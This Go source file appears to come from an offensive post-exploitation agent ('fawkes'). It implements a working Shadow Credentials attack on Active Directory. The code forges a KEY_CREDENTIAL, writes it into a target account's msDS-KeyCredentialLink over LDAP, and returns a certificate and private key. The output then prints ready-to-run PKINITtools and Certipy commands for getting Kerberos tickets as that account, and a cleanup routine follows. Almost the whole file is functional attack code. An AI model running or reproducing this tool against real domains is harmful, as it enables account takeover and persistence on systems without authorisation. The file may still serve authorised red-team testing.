package commands

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"math/big"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
)

// KEY_CREDENTIAL entry identifiers (MS-ADTS 2.2.22.2.1)
const (
	kcEntryKeyID                           = 1
	kcEntryKeyHash                         = 2
	kcEntryKeyMaterial                     = 3
	kcEntryKeyUsage                        = 4
	kcEntryKeySource                       = 5
	kcEntryDeviceID                        = 6
	kcEntryCustomKeyInformation            = 7
	kcEntryKeyApproximateLastLogonTimestamp = 8
	kcEntryKeyCreationTime                 = 9
)

// KEY_CREDENTIAL version
const kcVersion uint32 = 0x00000200

// KeyUsage values
const kcKeyUsageNGC byte = 0x01

// KeySource values
const kcKeySourceAD byte = 0x00

// BCRYPT_RSAPUBLIC_MAGIC = "RSA1" in little-endian
const bcryptRSAPublicMagic uint32 = 0x31415352

// buildKCEntry creates a single KEY_CREDENTIAL entry (identifier + length + data)
func buildKCEntry(id uint16, data []byte) []byte {
	entry := make([]byte, 2+4+len(data))
	binary.LittleEndian.PutUint16(entry[0:2], id)
	binary.LittleEndian.PutUint32(entry[2:6], uint32(len(data)))
	copy(entry[6:], data)
	return entry
}

// buildBCRYPTRSAKeyBlob encodes an RSA public key in BCRYPT_RSAKEY_BLOB format
func buildBCRYPTRSAKeyBlob(pub *rsa.PublicKey) []byte {
	modulus := pub.N.Bytes()
	exponent := big.NewInt(int64(pub.E)).Bytes()

	// Header: 6 x uint32 = 24 bytes
	blob := make([]byte, 24+len(exponent)+len(modulus))
	binary.LittleEndian.PutUint32(blob[0:4], bcryptRSAPublicMagic)
	binary.LittleEndian.PutUint32(blob[4:8], uint32(pub.N.BitLen()))
	binary.LittleEndian.PutUint32(blob[8:12], uint32(len(exponent)))
	binary.LittleEndian.PutUint32(blob[12:16], uint32(len(modulus)))
	binary.LittleEndian.PutUint32(blob[16:20], 0) // cbPrime1 (public only)
	binary.LittleEndian.PutUint32(blob[20:24], 0) // cbPrime2 (public only)
	copy(blob[24:], exponent)
	copy(blob[24+len(exponent):], modulus)
	return blob
}

// timeToFiletime converts a Go time to Windows FILETIME (100ns intervals since 1601-01-01)
func timeToFiletime(t time.Time) []byte {
	// Unix epoch (1970-01-01) as FILETIME = 116444736000000000
	const unixEpochFiletime = 116444736000000000
	// Convert Go time → Unix nanoseconds → 100ns intervals → add epoch offset
	ft := uint64(t.UnixNano()/100) + unixEpochFiletime
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, ft)
	return buf
}

// randomGUID generates a random 16-byte GUID
func randomGUID() ([]byte, error) {
	guid := make([]byte, 16)
	if _, err := rand.Read(guid); err != nil {
		return nil, err
	}
	// Set version 4 (random) and variant bits
	guid[6] = (guid[6] & 0x0f) | 0x40 // version 4
	guid[8] = (guid[8] & 0x3f) | 0x80 // variant 10
	return guid, nil
}

// formatGUID formats a 16-byte GUID as a string
func formatGUID(guid []byte) string {
	if len(guid) < 16 {
		return hex.EncodeToString(guid)
	}
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		binary.LittleEndian.Uint32(guid[0:4]),
		binary.LittleEndian.Uint16(guid[4:6]),
		binary.LittleEndian.Uint16(guid[6:8]),
		binary.BigEndian.Uint16(guid[8:10]),
		guid[10:16])
}

// buildKeyCredential constructs a KEY_CREDENTIAL v2 binary structure
func buildKeyCredential(pub *rsa.PublicKey) ([]byte, []byte, error) {
	// Build BCRYPT_RSAKEY_BLOB for key material
	keyMaterial := buildBCRYPTRSAKeyBlob(pub)

	// Generate random device ID
	deviceID, err := randomGUID()
	if err != nil {
		return nil, nil, fmt.Errorf("generating device ID: %v", err)
	}

	now := time.Now().UTC()
	filetime := timeToFiletime(now)

	// Build all entries (except KeyID and KeyHash which are computed)
	entryKeyMaterial := buildKCEntry(kcEntryKeyMaterial, keyMaterial)
	entryKeyUsage := buildKCEntry(kcEntryKeyUsage, []byte{kcKeyUsageNGC})
	entryKeySource := buildKCEntry(kcEntryKeySource, []byte{kcKeySourceAD})
	entryDeviceID := buildKCEntry(kcEntryDeviceID, deviceID)
	entryCustomKeyInfo := buildKCEntry(kcEntryCustomKeyInformation, []byte{0x01, 0x00})
	entryLastLogon := buildKCEntry(kcEntryKeyApproximateLastLogonTimestamp, filetime)
	entryCreationTime := buildKCEntry(kcEntryKeyCreationTime, filetime)

	// KeyID = SHA256 of raw key material data
	keyIDHash := sha256.Sum256(keyMaterial)
	entryKeyID := buildKCEntry(kcEntryKeyID, keyIDHash[:])

	// Compute KeyHash: SHA256 of (version + all entries except KeyHash)
	versionBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(versionBytes, kcVersion)

	var hashInput []byte
	hashInput = append(hashInput, versionBytes...)
	hashInput = append(hashInput, entryKeyMaterial...)
	hashInput = append(hashInput, entryKeyUsage...)
	hashInput = append(hashInput, entryKeySource...)
	hashInput = append(hashInput, entryDeviceID...)
	hashInput = append(hashInput, entryCustomKeyInfo...)
	hashInput = append(hashInput, entryLastLogon...)
	hashInput = append(hashInput, entryCreationTime...)
	hashInput = append(hashInput, entryKeyID...)

	keyHash := sha256.Sum256(hashInput)
	entryKeyHash := buildKCEntry(kcEntryKeyHash, keyHash[:])

	// Assemble final KEY_CREDENTIAL structure
	var credential []byte
	credential = append(credential, versionBytes...)
	credential = append(credential, entryKeyMaterial...)
	credential = append(credential, entryKeyUsage...)
	credential = append(credential, entryKeySource...)
	credential = append(credential, entryDeviceID...)
	credential = append(credential, entryCustomKeyInfo...)
	credential = append(credential, entryLastLogon...)
	credential = append(credential, entryCreationTime...)
	credential = append(credential, entryKeyID...)
	credential = append(credential, entryKeyHash...)

	return credential, deviceID, nil
}

// ldapShadowCred writes a KEY_CREDENTIAL to msDS-KeyCredentialLink
func ldapShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return structs.CommandResult{
			Output:    "Error: -target (account to add shadow credential to) is required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Generate RSA 2048 key pair
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error generating RSA key pair: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Build KEY_CREDENTIAL structure
	credential, deviceID, err := buildKeyCredential(&privateKey.PublicKey)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error building KEY_CREDENTIAL: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Create self-signed X.509 certificate for PKINIT usage
	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error generating serial number: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	certTemplate := &x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			CommonName: args.Target,
		},
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, certTemplate, certTemplate, &privateKey.PublicKey, privateKey)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating certificate: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Format DN-Binary value: B:<hexlen>:<hex>:<ownerDN>
	credHex := hex.EncodeToString(credential)
	dnBinaryValue := fmt.Sprintf("B:%d:%s:%s", len(credHex), credHex, targetDN)

	// Write to msDS-KeyCredentialLink (ADD operation to preserve existing values)
	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Add("msDS-KeyCredentialLink", []string{dnBinaryValue})

	if err := conn.Modify(modReq); err != nil {
		errMsg := fmt.Sprintf("Error writing msDS-KeyCredentialLink: %v", err)
		if strings.Contains(err.Error(), "Insufficient") || strings.Contains(err.Error(), "access") {
			errMsg += "\n[!] Insufficient permissions. Need: GenericWrite, WriteProperty on msDS-KeyCredentialLink, or WriteDACL on the target object."
		}
		if strings.Contains(err.Error(), "unwilling") || strings.Contains(err.Error(), "Unwilling") {
			errMsg += "\n[!] DC may not support Key Trust. Requires Windows Server 2016+ domain functional level."
		}
		return structs.CommandResult{
			Output:    errMsg,
			Status:    "error",
			Completed: true,
		}
	}

	// Encode certificate and private key as PEM
	certPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "CERTIFICATE",
		Bytes: certDER,
	})

	keyDER := x509.MarshalPKCS1PrivateKey(privateKey)
	keyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: keyDER,
	})

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] Shadow Credentials — msDS-KeyCredentialLink (T1556.006)\n"+
			"[+] Target:    %s\n"+
			"[+] DeviceID:  %s\n"+
			"[+] KeySize:   RSA-2048\n"+
			"[+] Server:    %s\n"+
			"[+] Status:    KEY_CREDENTIAL written successfully\n"+
			"\n--- Certificate (PEM) ---\n%s"+
			"\n--- Private Key (PEM) ---\n%s"+
			"\n[!] Usage with PKINITtools:\n"+
			"    python3 gettgtpkinit.py %s/%s -cert-pem cert.pem -key-pem key.pem out.ccache\n"+
			"\n[!] Usage with Certipy:\n"+
			"    certipy auth -pfx shadow.pfx -username %s -domain %s\n"+
			"\n[!] Cleanup: ldap-write -action clear-shadow-cred -server %s -target %s\n",
			targetDN, formatGUID(deviceID), args.Server,
			string(certPEM), string(keyPEM),
			extractDomain(targetDN), args.Target, args.Target, extractDomain(targetDN),
			args.Server, args.Target),
		Status:    "success",
		Completed: true,
	}
}

// ldapClearShadowCred removes all KEY_CREDENTIAL values from msDS-KeyCredentialLink
func ldapClearShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return structs.CommandResult{
			Output:    "Error: -target (account to clear shadow credentials from) is required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// First check if the attribute has values
	searchReq := ldap.NewSearchRequest(
		targetDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		1, 10, false,
		"(objectClass=*)",
		[]string{"msDS-KeyCredentialLink"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading msDS-KeyCredentialLink: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var existingCount int
	if len(result.Entries) > 0 {
		existingCount = len(result.Entries[0].GetAttributeValues("msDS-KeyCredentialLink"))
	}

	if existingCount == 0 {
		return structs.CommandResult{
			Output: fmt.Sprintf("[*] Shadow Credentials — msDS-KeyCredentialLink\n"+
				"[+] Target: %s\n"+
				"[+] Status: No key credentials found (attribute empty)\n", targetDN),
			Status:    "success",
			Completed: true,
		}
	}

	// Clear by replacing with empty value list
	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("msDS-KeyCredentialLink", []string{})

	if err := conn.Modify(modReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error clearing msDS-KeyCredentialLink: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] Shadow Credentials Cleared\n"+
			"[+] Target:  %s\n"+
			"[+] Removed: %d key credential(s)\n"+
			"[+] Server:  %s\n", targetDN, existingCount, args.Server),
		Status:    "success",
		Completed: true,
	}
}

// extractDomain extracts a domain name from a distinguished name
func extractDomain(dn string) string {
	parts := strings.Split(dn, ",")
	var domainParts []string
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToUpper(part), "DC=") {
			domainParts = append(domainParts, part[3:])
		}
	}
	if len(domainParts) > 0 {
		return strings.Join(domainParts, ".")
	}
	return "DOMAIN"
}
